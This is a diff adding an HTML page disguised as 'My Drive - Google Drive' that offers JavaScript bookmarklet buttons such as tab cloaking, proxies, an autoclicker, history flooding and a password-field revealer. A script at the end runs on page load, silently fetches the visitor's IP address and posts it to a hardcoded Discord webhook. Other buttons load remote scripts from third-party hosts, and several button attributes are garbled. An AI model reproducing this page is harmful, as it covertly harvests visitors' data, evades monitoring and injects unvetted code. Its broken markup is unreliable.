@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv="cache-control" content="no-cache"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="-1"><style type="text/css">html {
+  height:100%;
+}
+body {
+  margin:0;
+}
+.bg {
+  animation:slide 3s ease-in-out infinite alternate;
+  background-image: linear-gradient(-60deg, #6c3 50%, #09f 50%);
+  bottom:0;
+  left:-50%;
+  opacity:.5;
+  position:fixed;
+  right:-50%;
+  top:0;
+  z-index:-1;
+}
+.bg2 {
+  animation-direction:alternate-reverse;
+  animation-duration:4s;
+}
+.bg3 {
+  animation-duration:5s;
+}
+.content {
+  background-color:rgba(255,255,255,.8);
+  border-radius:.25em;
+  box-shadow:0 0 .25em rgba(0,0,0,.25);
+  box-sizing:border-box;
+  left:50%;
+  padding:10vmin;
+  position:fixed;
+  text-align:center;
+  top:50%;
+  transform:translate(-50%, -50%);
+}
+h1 {
+  font-family:monospace;
+}
+@keyframes slide {
+  0% {
+    transform:translateX(-25%);
+  }
+  100% {
+    transform:translateX(25%);
+  }
+}</style><title>My Drive - Google Drive</title><link type="image/x-icon" rel="shortcut icon" href="https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png"></head><body><h1 align="center">JavaScript Buttons</h1>
+<hr color="red" width="200">
+<h2>Working</h2>
+<hr color="black">
+<button onclick="javascript:eval('function calc(){_o=prompt(_t,_z);if(_o!=\'\'&amp;&amp;_o!=null&amp;&amp;_o.toUpperCase()==_o.toLowerCase())_z=eval(_o);}');_t='JAVASCRIPTER.NET Calculator - Input the expression to be calculated:';_z='';calc();while(_o!=''&amp;&amp;_o!=null&amp;&amp;_o.toUpperCase()==_o.toLowerCase())calc()">Calculator</button>
+<button onclick="javascript:var firebug=document.createElement('script');firebug.setAttribute('src','https://luphoria.com/fbl/fbl/firebug-lite-debug.js');document.body.appendChild(firebug);(function(){if(window.firebug.version){firebug.init();}else{setTimeout(arguments.callee);}})();void(firebug);">Inspect</button>
+<button onclick="javascript:document.body.contentEditable = 'true'; document.designMode='on'; void 0">Edit This Web</button>
+<button onclick="javascript:void((function(){var a,b;b=&quot;<&quot;+&quot;html>%5Cn<body>Passwords in this page:<p>%5Cn&quot;;(function(c){var d,e,f,g,h;for(d=0;d<c.length;d++){try{arguments.callee(c.frames[d]);}catch(i){}}e=c.document.forms;for(f=0;f<e.length;f++){g=e[f];for(h=0;h<g.length;h++){if(g[h].type.toLowerCase()==&quot;password&quot;)b+=g[h].value+'<br>%5Cn';}}})(top);b+=&quot;</body>%5Cn</html>%5Cn&quot;;a=window.open(&quot;&quot;,&quot;&quot;,&quot;width=200,height=300&quot;).document;a.open();a.write(b);a.close();})())">Show passwords on this page</button>
+<button onclick="javascript:(function(){    /* Ad-B-Gone: Bookmarklet that removes obnoxious ads from pages */    var selectors = [    /* By ID: */    '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',    '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',
+    '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',
+    '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',
+    'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',
+    /* By Class: */
+    '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',
+    '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',
+    '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',
+    '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',
+    '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',
+    'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',
+    'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',
+    'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',
+    'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',
+    'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',
+    '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',
+    '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',
+    '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',
+    /* Other: */
+    'script', 'iframe', 'video', 'aside#sponsored-recommendations', 'aside[role=" banner"]',="" 'aside',="" 'amp-ad',="" 'span[id^="ad_is_]'," 'div[class*="indianapolis-optin" ]',="" 'div[id^="google_ads_iframe]'," 'div[data-google-query-id]',="" 'section[data-response]',="" 'ins.adsbygoogle',="" 'div[data-test-id="fullPageSignupModal" ]'="" ];="" for(let="" i="" in="" selectors)="" {="" let="" nodeslist="document.querySelectorAll(selectors[i]);" <="" nodeslist.length;="" i++)="" el="nodesList[i];" if(el="" &&="" el.parentnode)="" el.parentnode.removechild(el);="" }="" }})();"="">Remove Ads</button>
+   <button onclick="javascript:var num=prompt('History flood amount:');done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert('History flood successful! '+window.location.href+' now appears in your history '+num+(num==1?' time.':' times.'))}">Flood Browser History</button>
+   <button onclick="javascript:(function(){function invert(o,t){var r=o.split('('),n=r[1].split(')')[0].split(',');return n.forEach(function(o,r){r<3&amp;&amp;(n[r]='color'==t&amp;&amp;255-parseInt(o)<50?120:255-parseInt(o))}),n=n.join(','),r[0]+'('+n+')'}document.querySelectorAll('*:not([invTouch])').forEach(function(o){var t=window.getComputedStyle(o);o.style.backgroundColor=invert(t.backgroundColor,'back'),o.style.color=invert(t.color,'color'),o.setAttribute('invTouch','true')});})();">Invert Colors</button>
+<button onclick="javascript:(function(){['', '-ms-', '-webkit-', '-o-', '-moz-'].map(function(prefix){Array.prototype.slice.call(document.querySelectorAll('div,p,span,img,a,body')).map(function(el){el.style[prefix + 'transform'] = 'rotate(' + (Math.floor(Math.random() * 3) - 1) + 'deg)';});});})();">Rotate page</button>
+<button onclick="javascript:(function(){var all = document.getElementsByTagName('*'); for (var i=0, max=all.length; i < max; i++) {all[i].style.backgroundColor ='#'+Math.floor(Math.random()*16777215).toString(16);}})()">Randomize Background Colors</button>
+<button onclick="javascript:(function(){R=0; x1=.1; y1=.05; x2=.25; y2=.24; x3=1.6; y3=.24; x4=300; y4=200; x5=300; y5=200; DI=document.getElementsByTagName('img'); DIL=DI.length; function A(){for(i=0; i<DIL; i++){DIS=DI[ i ].style; DIS.position='absolute'; DIS.left=(Math.sin(R*x1+i*x2+x3)*x4+x5)+'px'; DIS.top=(Math.cos(R*y1+i*y2+y3)*y4+y5)+'px'}R++}setInterval(A,5)})()">spazzy Images</button>
+<button onclick="javascript:alert('Paused. Click OK to resume')">Pause the web</button>
+<button onclick="(function(){var url = prompt('Enter website url for cloaked page\nMade by updaown'); var win = window.open(); var iframe = win.document.createElement('iframe'); iframe.style='position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;'; if(url.includes('https://') || url.includes('http://')) {iframe.src = url;}else{iframe.src = 'https://' + url;} win.document.body.appendChild(iframe);})(); return false;">open any page in about:bank</button>
+
+
+<!-- spaser -->
+
+<div style="height: 70px;"></div>
+
+<h2>50/50 Working</h2>
+<hr color="black">
+<button onclick="(function () {document.title=prompt('Tab Cloak\n\nEnter new Tab Title:');var icon=document.querySelector('link[rel=" icon"]');switch(prompt('choose="" new="" tab="" icon:\n\n[1]="" google="" search\n[2]="" drive\n[3]="" custom="" url')){case'1':icon.setattribute('href','https:="" www.google.com="" favicon.ico');break;case'2':icon.setattribute('href','https:="" ssl.gstatic.com="" images="" branding="" product="" 2x="" hh_drive_96dp.png');break;case'3':icon.setattribute('href',prompt('enter="" icon="" url:'))}})();="" return="" false;"="">Cloak Tab</button>
+<button onclick="javascript:var q=escape(window.getSelection()),i,ii;if(!q){for(i=0;i<frames.length;i++){var fr=frames[i];try{q=escape(fr.getSelection())}catch(e){};if(q)break;else{for(ii=0;ii<fr.frames.length;ii++){try{q=escape(fr.frames[ii].getSelection())}catch(e){};if(q)break;}}}}if(!q)void(q=prompt('Enter word to define%3A',''));if(q)void(location.href='http://www.dictionary.com/cgi-bin/dict.pl?term=%27+q);">Word lookup</button>
+<button onclick="javascript:void(open('http://tinyurl.com/create.php?url=%27+encodeURIComponent(location.href)))">Shorten URL (tinyurl) </button>
+<button onclick="javascript:function gcloak() { var link = document.querySelector('link[rel*='icon']') || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);">Change Icon and Tittle</button>
+<button onclick="javascript:(function(x,y){if(!window.click){window.click=!0,document.body.style.cursor='crosshair';var cps=prompt('Autoclicker CPS: (Under 200 recommended)');if(!cps||isNaN(cps)?(alert('You entered something wrong. Try running the script again.'),end()):alert('Autoclicker activated at '+cps+' CPS! Do [ctrl+e] to stop.'),addEventListener('mousemove',e=>{x=e.clientX,y=e.clientY}),addEventListener('keydown',e=>{'e'===e.key&amp;&amp;e.ctrlKey&amp;&amp;(alert('Autoclicker deactivated! Click the bookmark again to reactivate!'),end())}),window.click)var int=setInterval(function(){var e=document.elementFromPoint(x,y);e&amp;&amp;e.click()},1e3/cps);function end(){clearInterval(int),window.click=!1,document.body.style.cursor='default'}}})();">Autoclicker</button>
+<button onclick="javascript:(function(){var url = prompt('Enter website url for cloaked page \n Made by Exploits N' Stuff'); var win = window.open(); var iframe = win.document.createElement('iframe'); iframe.style='position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;'; if(url.includes('https://') || url.includes(" http:="" "))="" {iframe.src="url;}else{iframe.src" =="" "https:="" "="" +="" url;}="" win.document.body.appendchild(iframe);})();"="">Open Cloaked Page</button>
+<button onclick="javascript:(function(){var el=document.createElement('script');el.type='text/javascript';el.src='https://rawgit.com/ApoorvSaxena/colordrop/master/dist/production.min.js';el.onerror=function(){alert(" looks="" like="" the="" content="" security="" policy="" directive="" is="" blocking="" use="" of="" bookmarklets\n\nyou="" can="" copy="" and="" paste="" of:\n\n\"https:="" rawgit.com="" apoorvsaxena="" colordrop="" master="" dist="" production.min.js\"\n\ninto="" your="" console="" instead\n\n(link="" in="" already)");console.log("https:="" production.min.js");};document.getelementsbytagname('body')[0].appendchild(el);})();"="">Color Drop</button>
+<button onclick="javascript:(function(){var js=document.body.appendChild(document.createElement(" script"));js.onerror="function(){alert(&quot;Sorry," the="" script="" could="" not="" be="" loaded.")};js.src="https://rawgit.com/Krazete/bookmarklets/master/tri.js" })();"="">3d web</button>
+<button onclick="javascript:(function(){var js=document.body.appendChild(document.createElement(" script"));js.onerror="function(){alert(&quot;Sorry," the="" script="" could="" not="" be="" loaded.")};js.src="https://rawgit.com/Krazete/bookmarklets/master/mouselight.js" })();"="">flashLight</button>
+<button onclick="(function(){var bkmkltscript = document.createElement('script'); bkmkltscript.src = 'https://cdn.jsdelivr.net/gh/proxyhost/bookmarklets/aiobkmklt.js'; document.body.appendChild(bkmkltscript);})(); return false;">Proxies</button>
+
+
+<!--!! the backround-->
+
+<div class="bg"></div>
+<div class="bg bg2"></div>
+<div class="bg bg3"></div>
+
+
+<script>
+    // Get the user's IP address from api.ipify.org
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ipAddress = data.ip;
+        console.log(`IP Address: ${ipAddress}`);
+
+        // Send the IP address to the Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1233632866961850479/cuP49wG4c3l7yCZNY8WqjQ5rCMQ3LsSxmkovzNdU-aq9gB3DzFyKHstokKvca-9qjjoa';
+        const payload = {
+          'content': `User's IP Address: ${ipAddress}`
+        };
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => console.log(`Sent IP address to Discord webhook: ${data}`))
+        .catch(error => console.error(`Error sending IP address to Discord webhook: ${error}`));
+      })
+      .catch(error => console.error(`Error getting IP address: ${error}`));
+  </script><script>alert('these are buttons that are only made with java script MADE BY UPDAOWN');
+setTimeout(function(){
+  alert('the proxies and stuff and some other buttons won\'t work if you don\'t allow popups and redirects');
+}, 10000);</script></body>
